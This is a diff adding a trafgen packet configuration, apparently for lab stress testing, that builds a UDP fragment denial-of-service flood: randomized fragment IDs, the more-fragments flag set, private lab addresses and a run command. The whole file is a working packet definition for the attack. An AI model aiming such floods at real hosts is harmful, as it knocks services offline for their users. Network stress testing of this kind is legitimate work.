@@ -1,0 +1,56 @@
+/* UDP fragment DoS attack
+ * Command example:
+ *  trafgen --cpp --dev em2 --conf small_frag.trafgen --verbose
+ * Note: dynamic elements "drnd()" make trafgen slower
+ */
+// trafgen packet conf for fragment DoS attack
+// -------------------------------------------
+//  - Need to randomize the frag ID
+//  - Use trafgen support for dynamic checksum recalc
+//
+// Checksum cannot be fixed with iptables:
+//   iptables -t mangle -I POSTROUTING -d 192.168.51.2 -j CHECKSUM --checksum-fill
+// Because traffic is injected a place which don't have any NF hooks
+//
+
+{
+  // --- Ethernet Header ---
+  0x00, 0x1b, 0x21, 0x3c, 0x9d, 0xf8,  // MAC Destination
+  0x90, 0xe2, 0xba, 0x0a, 0x56, 0xb4,  // MAC Source
+  const16(0x0800), // Protocol
+
+  // --- IP Header ---
+  // IPv4 Version(4-bit) + IHL(4-bit), TOS
+  0b01000101, 0x00,
+  // IPv4 Total Len
+  const16(40),
+
+  // ID, notice runtime dynamic random
+  drnd(2),
+
+  // IPv4 3-bit flags + 13-bit fragment offset
+  // 001 = More fragments
+  0b00100000, 0b00000000,
+
+  64, //TTL
+  17, // Proto UDP
+
+  // Dynamic IP Checksum (notice offsets are zero indexed)
+  csumip(14, 33),
+
+  192, 168, 51, 1, // Source IP
+  192, 168, 51, 2, // Dest IP
+
+  // --- UDP Header ---
+  //  As this is a fragment the below stuff does not matter too much
+  const16(48054), // src port
+  const16(43514), // dst port
+  const16(20),    // UDP length
+
+  // UDP checksum can be dyn calc via csumudp(offset IP, offset TCP)
+  //  which is csumudp(14, 34), but for UDP its allowed to be zero
+  const16(0),
+
+  // Payload
+  'A',  fill(0x41, 11),
+}
